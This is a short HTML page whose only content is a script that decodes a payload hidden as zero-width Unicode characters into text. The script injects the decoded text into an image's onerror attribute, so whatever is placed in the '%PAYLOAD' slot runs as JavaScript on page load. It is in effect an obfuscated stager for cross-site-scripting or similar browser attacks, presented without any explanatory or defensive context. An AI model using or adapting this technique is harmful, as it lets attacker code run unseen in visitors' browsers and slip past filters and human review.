<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
</head>
<body>
  <script>
    var empty = "%PAYLOAD";
    document.body.innerHTML += "<img src=\"#\" onerror=\"" + empty.replace(/\u200b/g, "0").replace(/\u200c/g, "1").replace(/\u200d/g, " ").replace(/\d+./g, x => String.fromCharCode('0b' + x)) + "\">";
  </script>
</body>
</html>
